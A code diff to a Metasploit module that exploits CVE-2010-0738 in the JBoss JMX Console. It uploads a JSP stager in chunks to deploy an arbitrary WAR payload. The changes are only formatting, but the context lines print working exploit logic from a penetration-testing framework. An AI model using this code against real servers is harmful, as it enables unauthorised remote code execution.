@@ -8,42 +8,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'          => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
+      'Name' => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
       'Description' => %q{
         This module uses the DeploymentFileRepository class in the JBoss Application Server
         to deploy a JSP file which then deploys an arbitrary WAR file.
       },
-      'Author'        =>
-        [
-          'us3r777 <us3r777[at]n0b0.so>'
-        ],
-      'References'    =>
-        [
-          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
-          [ 'OSVDB', '64171' ],
-          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
-          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
-        ],
-      'Actions'       =>
-        [
-          ['Deploy', 'Description' => 'Create and deploy app (WAR) to deliver payload'],
-          ['Undeploy', 'Description' => 'Remove app (WAR) for cleanup']
-        ],
+      'Author' => [
+        'us3r777 <us3r777[at]n0b0.so>'
+      ],
+      'References' => [
+        [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
+        [ 'OSVDB', '64171' ],
+        [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
+        [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
+      ],
+      'Actions' => [
+        ['Deploy', 'Description' => 'Create and deploy app (WAR) to deliver payload'],
+        ['Undeploy', 'Description' => 'Remove app (WAR) for cleanup']
+      ],
       'DefaultAction' => 'Deploy',
-      'License'       => BSD_LICENSE,
+      'License' => BSD_LICENSE,
     )
 
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('APPBASE', [ true,  'Application base name', 'payload']),
-        OptPath.new('WARFILE',   [ false, 'The WAR file to deploy'])
-      ])
+        OptString.new('APPBASE', [ true, 'Application base name', 'payload']),
+        OptPath.new('WARFILE', [ false, 'The WAR file to deploy'])
+      ]
+    )
   end
 
   def deploy_action(app_base, war_data)
-    stager_base = Rex::Text.rand_text_alpha(8+rand(8))
-    stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
+    stager_base = Rex::Text.rand_text_alpha(8 + rand(8))
+    stager_jsp_name = Rex::Text.rand_text_alpha(8 + rand(8))
     encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
     stager_contents = stager_jsp_with_payload(app_base, encoded_payload)
 
@@ -52,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
       res = upload_file(stager_base, stager_jsp_name, stager_contents)
     else
       print_status("Deploying minimal stager to upload the payload...")
-      head_stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
+      head_stager_jsp_name = Rex::Text.rand_text_alpha(8 + rand(8))
       head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
       head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
       res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)
@@ -62,9 +60,9 @@ class MetasploitModule < Msf::Auxiliary
       current_pos = 0
       while current_pos < stager_contents.length
         next_pos = current_pos + 5000 + rand(100)
-        vars_get = { 'arg0' => stager_contents[current_pos,next_pos] }
+        vars_get = { 'arg0' => stager_contents[current_pos, next_pos] }
         print_status("Uploading second stager (#{current_pos}/#{stager_contents.length})")
-        res = deploy('uri'      => head_stager_uri,
+        res = deploy('uri' => head_stager_uri,
                      'vars_get' => vars_get)
         current_pos += next_pos
       end
@@ -72,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
     # but the file still gets written.
-    unless res && ( res.code == 200 || res.code == 500)
+    unless res && (res.code == 200 || res.code == 500)
       fail_with(Failure::Unknown, "Failed to deploy")
     end
 
